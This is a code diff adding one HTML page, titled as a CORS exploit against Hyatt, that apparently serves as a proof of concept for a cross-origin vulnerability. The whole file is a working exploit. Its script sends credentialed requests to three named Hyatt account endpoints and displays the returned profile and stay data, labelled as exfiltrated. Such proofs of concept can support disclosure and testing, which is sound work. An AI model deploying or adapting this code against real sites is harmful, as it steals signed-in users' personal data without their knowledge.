@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hyatt CORS Exploit</title>
+</head>
+<body>
+  <h1>Hyatt Data Exfiltration Demo</h1>
+  <script>
+    const endpoints = [
+      "https://www.hyatt.com/api/user/profile",
+      "https://www.hyatt.com/my-account",
+      "https://www.hyatt.com/profile/en-US/my-stays"
+    ];
+
+    endpoints.forEach((url) => {
+      fetch(url, {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log(`[${url}] EXFILTRATED:`, data);
+        document.body.innerHTML += `<pre style="white-space: pre-wrap;">[${url}]\n${data.slice(0, 3000)}...</pre><hr>`;
+      })
+      .catch(err => console.error(`[${url}] ERROR:`, err));
+    });
+    
+  </script>
+</body>
+</html>
